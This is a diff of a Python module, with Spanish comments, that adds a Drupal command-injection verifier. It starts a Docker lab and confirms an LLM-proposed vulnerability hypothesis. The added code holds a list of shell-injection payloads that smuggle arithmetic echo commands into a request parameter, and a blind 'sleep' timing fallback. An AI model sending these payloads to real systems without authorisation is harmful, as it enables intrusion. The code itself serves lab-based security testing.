@@ -34,7 +34,7 @@ from dataclasses import dataclass
 from typing import Callable, List, Optional
 
 from .wpverify import (WpVerifyResult, _docker_daemon_ok, _lab_host, _pick_param, _token,
-                       _ID_HINTS, _EMAIL_HINTS, _PASS_HINTS, _PATH_HINTS)
+                       _ID_HINTS, _EMAIL_HINTS, _PASS_HINTS, _PATH_HINTS, _CMD_HINTS)
 
 _MYSQL_IMAGE = "mysql:5.7"
 _DRUPAL_DRUSH_IMAGE = "binoracle-drupal-drush:10"
@@ -514,6 +514,156 @@ def verify_drupal_path_traversal(
                           f"{path_param} y ninguna devolvio el secreto plantado -- el traversal "
                           f"no se confirmo (puede necesitar otra profundidad de '../', otra "
                           f"codificacion, o el endpoint/parametro no son los reales)")
+        return res
+    except subprocess.TimeoutExpired as e:
+        res.detail = f"timeout de infraestructura: {e}"
+        return res
+    except Exception as e:
+        res.detail = f"error inesperado: {e}"
+        return res
+    finally:
+        step("desmontando el laboratorio (contenedores/red)...")
+        lab.teardown()
+
+
+def verify_drupal_command_injection(
+    module_source_dir: str, slug: str, endpoint: str, http_method: str,
+    parameters, cmd_param_hint: str = "",
+    on_step: Optional[Callable[[str], None]] = None, budget_s: float = 1200.0,
+) -> WpVerifyResult:
+    """Tercera clase de Drupal ("poco a poco"): equivalente a verify_wordpress_command_injection.
+    Misma prueba dura (el payload pide `$(( a + b ))` para dos numeros aleatorios; si la SUMA, que
+    nunca aparece en el payload enviado, sale en la respuesta, es prueba de ejecucion real de un
+    shell remoto) y el mismo fallback ciego por temporizacion (sleep) cuando la salida nunca se
+    refleja -- la logica de deteccion no depende del CMS, solo el laboratorio que la rodea."""
+    step = on_step or (lambda _m: None)
+    pre = _check_prereqs(module_source_dir, slug)
+    if pre is not None:
+        return pre
+    res = WpVerifyResult()
+    t0 = time.time()
+
+    cmd_param = cmd_param_hint or _pick_param(parameters, _CMD_HINTS)
+    if not cmd_param:
+        res.detail = "no se identifico el parametro que llega al comando del sistema"
+        res.limitations.append("la verificacion de command injection necesita saber que "
+                               "parametro llega al comando; afina 'parameters' en la hipotesis "
+                               "del LLM o pasalo a mano (cmd_param_hint)")
+        return res
+
+    lab = _Lab(_token())
+    try:
+        boot = _bootstrap_drupal_lab(lab, module_source_dir, slug, step, res, t0, budget_s)
+        if boot is None:
+            return res
+
+        a, b = secrets.randbelow(8000) + 1000, secrets.randbelow(8000) + 1000
+        expected = a + b
+        calc = f"$(( {a} + {b} ))"
+        attempts = [
+            f"; echo {calc}", f"| echo {calc}", f"&& echo {calc}", f"|| echo {calc}",
+            f"\necho {calc}\n", f"\r\necho {calc}\r\n",
+            f"`echo {calc}`", f"$(echo {calc})",
+            f"' ; echo {calc} ; '", f'" ; echo {calc} ; "',
+            f"' && echo {calc} && echo '", f'" && echo {calc} && echo "',
+            f"' | echo {calc} #", f'" | echo {calc} #',
+            f";echo${{IFS}}{calc}", f";echo%09{calc}",
+            f"; powershell -c \"{calc}\"", f"| powershell -c \"{calc}\"",
+            f"echo {calc}", calc,
+        ]
+        res.evidence.update({
+            "login_bajo_privilegio": boot.sub_user, "login_bajo_privilegio_password": boot.sub_pass,
+            "cmd_param": cmd_param, "a": a, "b": b, "suma_esperada": expected,
+            "metodo": (http_method or "GET").upper(), "endpoint": endpoint,
+        })
+
+        m = (http_method or "GET").upper()
+        pattern = re.compile(rf"(?<!\d){expected}(?!\d)")
+        found = False
+        tried = []
+        for payload_value in attempts:
+            payload = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
+            payload[cmd_param] = payload_value
+            step(f"probando {m} {endpoint} con {cmd_param}={payload_value!r}...")
+            try:
+                resp = boot.sub_sess.request(m, boot.base_url + endpoint,
+                                   data=payload if m != "GET" else None,
+                                   params=payload if m == "GET" else None, timeout=20)
+            except Exception as e:
+                tried.append({"payload": payload_value, "error": str(e)})
+                continue
+            matched = bool(pattern.search(resp.text or ""))
+            tried.append({"payload": payload_value, "status": resp.status_code, "suma_presente": matched})
+            if matched:
+                found = True
+                res.evidence["payload_ganador"] = payload_value
+                res.evidence["status_code_respuesta"] = resp.status_code
+                res.evidence["respuesta_cuerpo_recorte"] = (resp.text or "")[:500]
+                step(f"VERIFICADO: la respuesta contiene {expected} (={a}+{b}), calculado por un "
+                     f"shell remoto -- ese numero no aparece en el payload enviado.")
+                break
+        res.evidence["intentos"] = tried
+
+        sleep_evidence = None
+        if not found:
+            step("ninguna variante reflejo la suma; probando blind command injection por "
+                 "temporizacion (sleep)...")
+            base_payload = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
+            base_payload[cmd_param] = "1"
+            try:
+                t_base0 = time.time()
+                boot.sub_sess.request(m, boot.base_url + endpoint,
+                                      data=base_payload if m != "GET" else None,
+                                      params=base_payload if m == "GET" else None, timeout=20)
+                baseline_s = time.time() - t_base0
+            except Exception:
+                baseline_s = None
+            sleep_n = 6
+            sleep_attempts = [f"; sleep {sleep_n}", f"| sleep {sleep_n}", f"`sleep {sleep_n}`",
+                              f"$(sleep {sleep_n})", f"&& sleep {sleep_n}"]
+            for sp in sleep_attempts:
+                payload = dict(parameters) if isinstance(parameters, dict) else {p: "" for p in (parameters or [])}
+                payload[cmd_param] = sp
+                step(f"probando {m} {endpoint} con {cmd_param}={sp!r} (temporizacion)...")
+                try:
+                    t0_s = time.time()
+                    boot.sub_sess.request(m, boot.base_url + endpoint,
+                                          data=payload if m != "GET" else None,
+                                          params=payload if m == "GET" else None,
+                                          timeout=sleep_n + 15)
+                    elapsed = time.time() - t0_s
+                except Exception:
+                    continue
+                delayed = (baseline_s is not None and elapsed - baseline_s >= sleep_n - 1.5)
+                sleep_evidence = {"payload": sp, "baseline_s": round(baseline_s, 2) if baseline_s else None,
+                                  "elapsed_s": round(elapsed, 2), "retraso_consistente": delayed}
+                if delayed:
+                    found = True
+                    res.evidence["payload_ganador"] = sp
+                    res.evidence["tecnica"] = "blind-timing"
+                    step(f"VERIFICADO (blind/timing): la peticion con {sp!r} tardo {elapsed:.1f}s "
+                         f"frente a {baseline_s:.1f}s de control.")
+                    break
+            res.evidence["blind_timing_intento"] = sleep_evidence
+
+        if found:
+            res.verified = True
+            res.ok = True
+            if res.evidence.get("tecnica") == "blind-timing":
+                res.detail = (f"COMMAND INJECTION confirmada (blind/timing): la peticion con "
+                              f"{cmd_param}={res.evidence['payload_ganador']!r} retraso la "
+                              f"respuesta de forma consistente con 'sleep {sleep_n}' ejecutandose "
+                              f"de verdad en un shell remoto")
+            else:
+                res.detail = (f"COMMAND INJECTION confirmada: la peticion con {cmd_param}="
+                              f"{res.evidence['payload_ganador']!r} hizo que el servidor "
+                              f"EJECUTARA {a}+{b} y devolviera {expected} en la respuesta")
+        else:
+            res.ok = True
+            res.detail = (f"se probaron {len(tried)} variantes de inyeccion (aritmetica "
+                          f"reflejada) y de timing ciega para {cmd_param}, y ninguna confirmo la "
+                          f"suma esperada ({a}+{b}={expected}) ni un retraso consistente -- la "
+                          f"inyeccion de comandos no se confirmo")
         return res
     except subprocess.TimeoutExpired as e:
         res.detail = f"timeout de infraestructura: {e}"
